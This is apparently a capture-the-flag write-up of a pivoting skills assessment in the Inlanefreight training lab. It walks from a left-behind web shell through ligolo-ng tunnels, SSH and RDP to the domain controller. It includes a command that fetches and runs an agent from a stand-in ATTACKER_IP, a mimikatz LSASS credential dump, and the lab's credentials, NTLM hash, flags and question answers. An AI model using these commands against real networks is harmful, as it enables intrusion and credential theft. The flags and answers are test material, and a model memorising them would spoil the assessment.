# Skills Assessment

## Context
> A team member started a Penetration Test against the Inlanefreight environment but was moved to another project. They left a **web shell** in place for us to continue. We need to leverage the web shell to enumerate hosts, identify services, and pivot through internal networks until we reach the **Inlanefreight Domain Controller**.

## Objectives
- [x] Access the first system via the web shell
- [x] Enumerate and pivot to an internal host
- [x] Continue pivoting until reaching the Domain Controller
- [x] Capture all flags along the way
- [x] Use data, credentials, scripts found in the environment

## Starting Point
- **External Access:** Web shell at `10.129.229.129` (later `10.129.75.160`, then `10.129.52.97` after restarts)
- **Target Environment:** Inlanefreight internal network
- **Goal:** Domain Controller flag

## Complete Pivot Chain

```
[External]
    |
    v
[10.129.52.97] — Web Shell (p0wny@shell, www-data)
    |
    | Ligolo tunnel #1
    v
[172.16.5.15] — Web shell internal NIC (ens192)
    |
    | SSH (mlefay:Plain Human work!)
    v
[172.16.5.35] — PIVOT-SRV01 (mlefay, BUILTIN\Administrators)
    |   |
    |   | RDP + mimikatz → vfrank creds
    |   v
    | [INLANEFREIGHT\vfrank : Imply wet Unmasked!]
    |
    | Ligolo tunnel #2 (agent on PIVOT-SRV01)
    v
[172.16.6.25] — PIVOTWIN10 (vfrank, Domain Admin!)
    |   |
    |   | Second NIC: 172.16.10.25
    |   v
    | [172.16.10.5] — DC01 (ACADEMY-PIVOT-D)
    |       |
    |       | WinRM (Enter-PSSession ACADEMY-PIVOT-D)
    |       v
    |   Flag: 3nd-0xf-Th3-R@inbow! ✅
    |
    | Flag: N3tw0rk-H0pping-f0R-FuN ✅
    |
    | Flag: S1ngl3-Piv07-3@sy-Day ✅
```

---

## Phase 1: Web Shell Enumeration

**Web Shell Found:** `p0wny@shell` on port 80
- **URL:** `http://10.129.52.97`
- **User:** `www-data`
- **OS:** Ubuntu (Apache 2.4.41)

### Credentials Discovered
**File:** `/home/webadmin/for-admin-eyes-only`
```
# note to self,
in order to reach server01 or other servers in the subnet from here
you have to us the user account: mlefay
with a password of: Plain Human work!
```

| Question | Answer |
|----------|--------|
| Q1: What user's directory contains credentials? | `webadmin` |
| Q2: Credentials found | `mlefay:Plain Human work!` |

---

## Phase 2: Ligolo-ng Tunnel #1 (Webshell → Attack Box)

**From webshell host (www-data reverse shell):**
```bash
# Download and run ligolo-ng agent
wget http://ATTACKER_IP:8080/agent -O /tmp/agent
chmod +x /tmp/agent
/tmp/agent -connect ATTACKER_IP:11601 -ignore-cert
```

**On attack box (ligolo proxy):**
```bash
ligolo-ng -bind 0.0.0.0:11601
session                    # select agent
sudo ip route add 172.16.0.0/16 dev ligolo
```

**Route added:** `172.16.0.0/16 dev ligolo`

---

## Phase 3: Internal Network Discovery

**Host Discovery:**
```bash
# Ping sweep through tunnel
for i in $(seq 1 254); do
    (ping -c 1 -W 1 172.16.5.$i | grep "bytes from" &)
done
```

**Results:**
- `172.16.5.15` — Web shell host (internal NIC)
- `172.16.5.35` — PIVOT-SRV01

| Question | Answer |
|----------|--------|
| Q3: Active internal host discovered | `172.16.5.15` |

---

## Phase 4: Pivot to PIVOT-SRV01

**SSH from attack box (via ligolo tunnel):**
```bash
ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null mlefay@172.16.5.35
# Password: Plain Human work!
```

**Connection successful!**
```
mlefay@PIVOT-SRV01 C:\Users\mlefay>
```

### PIVOT-SRV01 Enumeration

| Property | Value |
|----------|-------|
| **Hostname** | PIVOT-SRV01 |
| **Domain** | INLANEFREIGHT.LOCAL |
| **OS** | Windows Server 2019 Standard |
| **NIC 1** | 172.16.5.35 |
| **NIC 2** | 172.16.6.35 |
| **User** | mlefay (BUILTIN\Administrators) |

**Open Ports:** 22 (SSH), 135 (MSRPC), 139 (NetBIOS), 445 (SMB), 3389 (RDP), 5985 (WinRM)

### Flag 1 Captured ✅

```powershell
type C:\Flag.txt
```
**Flag:** `S1ngl3-Piv07-3@sy-Day`

| Question | Answer |
|----------|--------|
| Q4: Flag on discovered host | `S1ngl3-Piv07-3@sy-Day` |

---

## Phase 5: Service Account Enumeration (Question 5)

**Services running as domain accounts:**
```powershell
wmic service get name,startname | findstr "INLANEFREIGHT"
```

**Results:**
```
DHCPServer     INLANEFREIGHT\vfrank
SCardSvr       INLANEFREIGHT\vfrank
```

| Question | Answer |
|----------|--------|
| Q5: Vulnerable service account user | `vfrank` |

---

## Phase 6: Mimikatz Credential Extraction

**Setup:**
- RDP to PIVOT-SRV01 as mlefay (Admin)
- Transferred mimikatz.exe
- Ran as Administrator

**Commands:**
```powershell
privilege::debug
sekurlsa::logonpasswords
```

**vfrank Credentials Found:**
| Account | Password | Domain |
|---------|----------|--------|
| `vfrank` | `Imply wet Unmasked!` | `INLANEFREIGHT` |

**Also captured:**
- NTLM: `2e16a00be74fa0bf862b4256d0347e83`
- Logon Server: `ACADEMY-PIVOT-D`

---

## Phase 7: Ligolo-ng Tunnel #2 (PIVOT-SRV01 → Attack Box)

**Double tunnel setup:**
- Uploaded `agent.exe` to PIVOT-SRV01
- Connected back through first tunnel
- Created `ligolo_2nd` interface
- Added route: `172.16.6.0/16` via `ligolo_2nd`

**Tunnel Status:**
```
ligolo     → www-data@inlanefreight.local (172.16.5.15) — Online
ligolo_2nd → PIVOT-SRV01\mlefay@PIVOT-SRV01 (172.16.6.35) — Online
```

---

## Phase 8: Pivot to PIVOTWIN10 (172.16.6.25)

**RDP access with vfrank:**
```bash
xfreerdp3 /v:172.16.6.25 /u:vfrank /p:'Imply wet Unmasked!' /cert:ignore
```

**PIVOTWIN10 Enumeration:**
| Property | Value |
|----------|-------|
| **Hostname** | PIVOTWIN10 |
| **Domain** | INLANEFREIGHT.LOCAL |
| **NIC 1** | 172.16.6.25 |
| **NIC 2** | **172.16.10.25** ← DC network! |
| **User** | vfrank (INLANEFREIGHT\Domain Admins) |
| **DNS Server** | 172.16.10.5 ← DC IP! |

### Flag 2 Captured ✅

```powershell
type C:\Flag.txt
```
**Flag:** `N3tw0rk-H0pping-f0R-FuN`

| Question | Answer |
|----------|--------|
| Q6: Flag on workstation | `N3tw0rk-H0pping-f0R-FuN` |

---

## Phase 9: Domain Controller Access (172.16.10.5)

**Hostname discovered:** `ACADEMY-PIVOT-D` (from mimikatz Logon Server)

**WinRM connection from PIVOTWIN10:**
```powershell
Enter-PSSession -ComputerName ACADEMY-PIVOT-D -Credential (Get-Credential)
# Username: INLANEFREIGHT\vfrank
# Password: Imply wet Unmasked!
```

**Connection successful!**
```
[ACADEMY-PIVOT-D]: PS C:\>
```

### Flag 3 Captured ✅ (FINAL)

```powershell
type C:\Flag.txt.txt
```
**Flag:** `3nd-0xf-Th3-R@inbow!`

| Question | Answer |
|----------|--------|
| Q7: Flag on Domain Controller | `3nd-0xf-Th3-R@inbow!` |

---

## Complete Flags Summary

| # | Location | Host | Flag |
|---|----------|------|------|
| 1 | PIVOT-SRV01 | 172.16.5.35 | `S1ngl3-Piv07-3@sy-Day` |
| 2 | PIVOTWIN10 (Workstation) | 172.16.6.25 | `N3tw0rk-H0pping-f0R-FuN` |
| 3 | DC01 (Domain Controller) | 172.16.10.5 | `3nd-0xf-Th3-R@inbow!` |

---

## Complete Credentials Summary

| Account | Password | Source | Valid On |
|---------|----------|--------|----------|
| `mlefay` | `Plain Human work!` | `/home/webadmin/for-admin-eyes-only` | SSH to 172.16.5.35 |
| `INLANEFREIGHT\vfrank` | `Imply wet Unmasked!` | mimikatz LSASS dump (PIVOT-SRV01) | Domain Admin — All hosts |

---

## Network Topology Discovered

```
10.129.52.97 (External) → 172.16.5.0/16 → 172.16.6.0/16 → 172.16.10.0/16
    |                         |                  |                  |
    v                         v                  v                  v
[Webshell Host]        [PIVOT-SRV01]      [PIVOTWIN10]      [DC01]
www-data               mlefay (Admin)     vfrank (DA)       ACADEMY-PIVOT-D
```

---

## Lessons Learned

1. **Web shells are gold** — Previous team member left p0wny@shell, instant access
2. **Read all files** — `for-admin-eyes-only` literally contained credentials
3. **Ligolo-ng for multi-hop pivoting** — Two agents, two TUN interfaces, seamless routing
4. **SSH through tunnels** — Once ligolo route is active, SSH from attack box as if local
5. **Windows services expose domain accounts** — `wmic service get name,startname` reveals `INLANEFREIGHT\vfrank`
6. **Mimikatz on service accounts** — Services running as domain users store creds in LSASS
7. **Multi-NIC servers = network bridges** — PIVOT-SRV01 (172.16.5.x + 172.16.6.x), PIVOTWIN10 (172.16.6.x + 172.16.10.x)
8. **DNS server = Domain Controller** — `ipconfig /all` on PIVOTWIN10 revealed DC at 172.16.10.5
9. **WinRM needs hostname when using IP** — `Enter-PSSession ACADEMY-PIVOT-D` worked, IP failed with TrustedHosts error
10. **Domain Admin creds unlock everything** — vfrank's password worked across all domain hosts

---

## Tools Used
- `p0wny@shell` — Web shell access
- `ligolo-ng` — Double tunnel (two agents, two TUN interfaces)
- `mimikatz` — LSASS credential extraction
- `xfreerdp3` — RDP connections
- `ssh` — SSH tunnel and shell access
- `winrm` / `Enter-PSSession` — PowerShell remoting to DC
- `wmic service` — Service enumeration
- `nmap` — Port scanning (through tunnels)

---

*Started: 2026-04-23*
*Completed: 2026-04-24 10:01 UTC+8*
*Status: ✅ COMPLETE — All 7 questions answered, all 3 flags captured*
*Assessment: 🏆 PASSED*
